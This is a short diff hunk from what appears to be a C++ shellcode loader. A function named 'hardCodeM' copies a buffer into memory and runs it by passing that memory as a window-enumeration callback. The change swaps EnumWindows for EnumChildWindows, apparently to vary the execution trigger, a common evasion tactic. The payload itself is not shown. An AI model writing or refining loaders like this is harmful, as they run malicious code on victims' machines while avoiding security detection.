@@ -38,7 +38,7 @@ void hardCodeM() {
 	RtlMoveMemory(ptr, buffer, sizeof(buffer));
 
 	//callback
-    ::EnumWindows((WNDENUMPROC)ptr, NULL);
+    ::EnumChildWindows(NULL, (WNDENUMPROC)ptr, NULL);
 }
 
 
